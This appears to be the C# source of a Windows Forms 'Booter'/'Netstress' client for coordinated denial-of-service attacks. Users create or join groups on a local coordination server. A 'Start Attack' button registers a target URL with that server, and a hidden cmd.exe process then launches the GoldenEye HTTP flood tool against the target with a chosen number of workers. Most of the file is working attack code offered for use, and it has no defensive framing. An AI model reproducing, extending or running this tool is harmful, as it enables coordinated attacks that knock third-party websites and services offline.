using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;

namespace Booter
{
    public partial class Form1 : Form
    {

        public string Get(string uri)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (Stream stream = response.GetResponseStream())
                return response.StatusCode.ToString();
        }

        public string GetText(string uri)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (Stream stream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(stream))
            {
                return reader.ReadToEnd();
            }
        }

        public Form1()
        {
            
            InitializeComponent();
            try
            {
                var host = "http://127.0.0.1:3000";
                string[] readText = File.ReadAllLines("./config.json");
                Get(host + "/check?id=" + readText[0] + "&key=" + readText[1]);
                panel1.Visible = true;
                panel2.Visible = false;
                panel3.Visible = true;
                label8.Text = readText[0];

            }
            catch(Exception)
            { 
                Console.WriteLine("Malformed save file for creation.");
                try
                {

                    string[] readText = File.ReadAllLines("./config.json");


                    panel2.Visible = false;
                    panel3.Visible = true;
                    label8.Text = readText[1];

                }
                catch (Exception)
                {
                    Console.WriteLine("Malformed save file for join.");
                }
            }

            





        }


        

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            label5.Text = trackBar1.Value.ToString();
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void label6_Click(object sender, EventArgs e)
        {

        }



        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {
            var host = "http://127.0.0.1:3000";
            if(radioButton1.Checked)
            {
                try
                {
                    Int64.Parse(textBox1.Text);
                    radioButton1.Checked = false;
                    var pwd = Interaction.InputBox("Netstress", "Enter group password", "", 0, 0);
                    var request = Get(host + "/new?id=" + textBox1.Text + "&key=" + pwd);
                    if (request == "Created")
                    {
                        using (StreamWriter writer = new StreamWriter("./config.json"))
                        {
                            writer.WriteLine(textBox1.Text);
                            writer.WriteLine(pwd);

                        }
                        panel1.Visible = true;
                        panel2.Visible = false;
                        panel3.Visible = true;
                        label8.Text = textBox1.Text;
                        MessageBox.Show("Successfully created a group with the ID of '" + textBox1.Text+"'");

                    } else if (request == "OK")
                    {
                        MessageBox.Show("Couldn't create a group, this might be because someone has already taken the ID of '"+textBox1.Text+"'");
                    }

                }
                catch(Exception)
                {
                    //Console.WriteLine(ex.ToString());
                    radioButton1.Checked = false;
                    MessageBox.Show("Create group should only consist of numbers.");
                }

                    
            }
        }

        private void panel2_Paint(object sender, PaintEventArgs e)
        {

        }

        public void hitURL(string url, int workers)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = @"/C .\goldeneye\goldeneye.exe "+url+" -w "+workers.ToString();
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardInput = true;
            process.Start();
        }

        private void radioButton2_CheckedChanged(object sender, EventArgs e)
        {
            var host = "http://127.0.0.1:3000";
            if (radioButton2.Checked)
            {
                try
                {
                    Int64.Parse(textBox2.Text);
                    radioButton2.Checked = false;
                    
                    var request = Get(host + "/join?id=" + textBox2.Text);
                    if (request == "Created")
                    {
                        using (StreamWriter writer = new StreamWriter("./config.json"))
                        {
                            writer.WriteLine("join");
                            writer.WriteLine(textBox2.Text);

                        }
                        panel3.Visible = true;
                        panel2.Visible = false;
                        label8.Text = textBox2.Text;
                        MessageBox.Show("Successfully joined the group with the ID of '" + textBox2.Text + "'");
                    }
                    else if (request == "OK")
                    {
                        MessageBox.Show("Couldn't join the group with the ID of '" + textBox2.Text + "'");
                    }

                }
                catch (Exception)
                {
                    //Console.WriteLine(ex.ToString());
                    radioButton2.Checked = false;
                    MessageBox.Show("Join group should only consist of numbers.");
                }


            }

        }

        private void button1_Click(object sender, EventArgs e)
        {
            var host = "http://127.0.0.1:3000";
            if(button1.Text == "Start Attack")
            {
                try
                {

                    string[] readText = File.ReadAllLines("./config.json");


                    Console.WriteLine(readText);


                    var request = Get(host + "/attack?id=" + readText[0] + "&key=" + readText[1] + "&url=" + textBox3.Text);
                    if (request == "Created")
                    {
                        textBox3.Enabled = false;
                        trackBar1.Enabled = false;
                        button1.Text = "Stop Attack";
                        hitURL(textBox3.Text, trackBar1.Value);

                        MessageBox.Show("Successfully started attacking to '" + textBox3.Text + "'");
                    }
                    else if (request == "OK")
                    {
                        MessageBox.Show("Couldn't attack '" + textBox3.Text + "'");
                    }

                }
                catch (Exception)
                {
                    MessageBox.Show("ERROR: Malformed URL.");

                }
            }
            else
            {
                try
                {

                    string[] readText = File.ReadAllLines("./config.json");


                    Console.WriteLine(readText);


                    var request = Get(host + "/stop?id=" + readText[0] + "&key=" + readText[1] + "&url=" + textBox3.Text);
                    if (request == "Created")
                    {
                        textBox3.Enabled = true;
                        trackBar1.Enabled = true;
                        label9.Visible = false;
                        linkLabel2.Visible = false;
                        button1.Text = "Start Attack";
                        MessageBox.Show("The attack on '" + textBox3.Text + "' will stop completely when PC restarts.");
                        this.Close();
                    }
                    else if (request == "OK")
                    {
                        MessageBox.Show("Couldn't stop attack '" + textBox3.Text + "'");
                    }

                }
                catch (Exception)
                {
                    MessageBox.Show("ERROR: Malformed URL.");

                }
            }



        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            File.Delete("./config.json");
            panel3.Visible = false;
            panel2.Visible = true;
            panel1.Visible = false;
        }

        private void panel4_Paint(object sender, PaintEventArgs e)
        {

        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            var host = "http://127.0.0.1:3000";
            string[] readText = File.ReadAllLines("./config.json");
            if (readText[0] == "join")
            {
                
                try
                {
                    linkLabel2.Text = GetText(host + "/sync?id=" + readText[1]);
                } catch (Exception)
                {
                    MessageBox.Show("No current attacks!");
                    return;
                }

                label9.Visible = true;
                linkLabel2.Visible = true;

            } else
            {
                try
                {
                    linkLabel2.Text = GetText(host + "/sync?id=" + readText[0]);
                }
                catch (Exception)
                {
                    MessageBox.Show("No current attacks!");
                    return;
                }

                label9.Visible = true;
                linkLabel2.Visible = true;
            }
            
        }
    }
}
